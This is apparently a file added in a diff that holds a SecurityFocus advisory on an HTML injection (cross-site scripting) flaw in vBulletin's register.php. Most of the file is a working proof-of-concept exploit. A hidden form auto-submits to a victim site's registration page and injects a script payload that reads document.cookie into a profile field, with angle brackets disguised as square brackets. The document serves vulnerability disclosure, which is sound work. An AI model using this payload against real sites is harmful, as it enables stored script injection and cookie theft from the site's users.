@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/8354/info
+
+vBulletin may be prone to an HTML injection vulnerability. This issue is exposed through inadequate sanitization of user input for certain fields within the register.php script. An attacker may exploit this issue by including hostile HTML and script code in fields that may be displayed in posts to the message board, or the user's profile. This code may be rendered in the web browser of a user who views the malicious message.
+
+[form action="http://[victim]/register.php?do=register" method="post"
+style="display:none"]
+[input type="hidden" name="s" value="" /]
+[input type="hidden" name="regtype" value="1" /]
+[input type="text" class="bginput" name="field1" value="" size="25"
+maxlength="250" /]
+[input type="hidden" name="url" value="index.php" /]
+[input type="hidden" name="do" value="addmember" /] 
+[/form]
+[script]
+//Code that will be executed
+var xss = "\"][script]alert(document"+".cookie)[\/script]";
+document.forms[0].field1.value=xss;
+document.forms[0].submit();
+[/script]
+
+*Replace ([],<>)
